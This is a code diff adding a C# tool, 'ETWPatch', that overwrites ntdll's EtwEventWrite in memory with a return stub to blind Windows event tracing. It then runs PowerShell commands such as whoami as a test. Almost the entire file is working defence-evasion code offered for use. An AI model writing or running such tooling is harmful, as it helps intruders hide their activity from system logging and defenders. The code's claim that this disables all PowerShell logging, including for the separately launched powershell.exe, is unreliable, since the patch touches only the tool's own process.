@@ -1,0 +1,107 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+namespace ETWPatch
+{
+    class Program
+    {
+        // Import Windows API functions
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        static void Main(string[] args)
+        {
+            Console.WriteLine("ETW Memory Patching Tool");
+            Console.WriteLine("Loading ntdll.dll...");
+
+            // Step 1: Load ntdll and get EtwEventWrite address
+            var ntdll = LoadLibrary("ntdll.dll");
+            if (ntdll == IntPtr.Zero)
+            {
+                Console.WriteLine("ERROR: Failed to load ntdll.dll");
+                return;
+            }
+
+            var etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
+            if (etwEventWrite == IntPtr.Zero)
+            {
+                Console.WriteLine("ERROR: Failed to find EtwEventWrite function");
+                return;
+            }
+
+            Console.WriteLine($"EtwEventWrite found at: 0x{etwEventWrite.ToInt64():X}");
+
+            // Step 2: Prepare patch bytes
+            // ret 14h = 0xC2 0x14 0x00 (return and pop 14h bytes from stack)
+            byte[] patch = { 0xC2, 0x14, 0x00 };
+
+            try
+            {
+                Console.WriteLine("Patching EtwEventWrite...");
+
+                // Step 3: Change memory protection to allow writing
+                uint oldProtect;
+                if (!VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect))
+                {
+                    Console.WriteLine("ERROR: Failed to change memory protection");
+                    return;
+                }
+
+                Console.WriteLine("Memory protection changed successfully");
+
+                // Step 4: Write patch to memory
+                Marshal.Copy(patch, 0, etwEventWrite, patch.Length);
+                Console.WriteLine("Patch written to memory");
+
+                // Step 5: Restore original memory protection (optional)
+                VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, oldProtect, out uint temp);
+
+                // Step 6: Flush instruction cache
+                FlushInstructionCache(GetCurrentProcess(), etwEventWrite, (UIntPtr)patch.Length);
+
+                Console.WriteLine("SUCCESS: ETW patching completed!");
+                Console.WriteLine("PowerShell logging should now be completely disabled");
+
+                // Test the patch
+                Console.WriteLine("Testing patch with PowerShell command...");
+                var psi = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = "-Command \"Write-Host 'This should not be logged anywhere'; Get-Process | Select-Object -First 3; whoami\"",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    CreateNoWindow = true
+                };
+
+                var process = Process.Start(psi);
+                string output = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
+
+                Console.WriteLine("PowerShell command executed:");
+                Console.WriteLine(output);
+                Console.WriteLine("Check Event Viewer - there should be NO PowerShell events!");
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"ERROR: {ex.Message}");
+            }
+
+            Console.WriteLine("Press any key to exit...");
+            Console.ReadKey();
+        }
+    }
+}
